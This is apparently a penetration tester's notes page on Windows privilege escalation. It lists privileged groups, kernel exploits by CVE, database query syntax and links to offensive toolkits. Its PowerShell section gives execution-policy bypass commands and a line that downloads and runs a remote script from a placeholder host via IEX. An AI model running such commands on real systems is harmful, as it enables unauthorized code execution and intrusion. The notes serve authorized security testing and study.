# Windows Privilege Escalation Reference

Extended reference for Windows privesc. For core commands and checklist, see [[Windows Privilege Escalation]].

## SeImpersonatePrivilege

Refer to https://jlajara.gitlab.io/Potatoes_Windows_Privesc

https://github.com/Flangvik/SharpCollection

## Privilege Groups

**High Value Groups:**
- Administrators (full system access)
- Backup Operators (can backup/restore files - bypass ACLs)
- Remote Desktop Users (RDP access)
- Remote Management Users (WinRM access)

## Kernel Exploits (Last Resort)

**Only use as last resort due to crash risk:**
- MS16-032 (Secondary Logon Handle)
- MS17-010 (EternalBlue)
- CVE-2020-0796 (SMBGhost)
- CVE-2021-1675 (PrintNightmare)

Check `systeminfo` output against Windows Exploit Suggester.

## PowerShell Execution Policy Bypass

```powershell
powershell -ep bypass
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://IP/script.ps1')"
```

## Database Syntax Quick Reference

**MySQL/MariaDB:**
```sql
SHOW DATABASES;
USE database_name;
SHOW TABLES;
SELECT * FROM table_name;
```

**MSSQL:**
```sql
SELECT name FROM sys.databases;
USE database_name;
SELECT * FROM INFORMATION_SCHEMA.TABLES;
SELECT * FROM table_name;
```

**SQLite:**
```bash
sqlite3 database.db
.databases
.tables
SELECT * FROM table_name;
```

## Resources

- PowerSploit: https://github.com/PowerShellMafia/PowerSploit
- PEASS-ng WinPEAS: https://github.com/carlospolop/PEASS-ng
- HackTricks Windows PrivEsc: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
- LOLBAS Project: https://lolbas-project.github.io/
- Potato Exploits Guide: https://jlajara.gitlab.io/Potatoes_Windows_Privesc
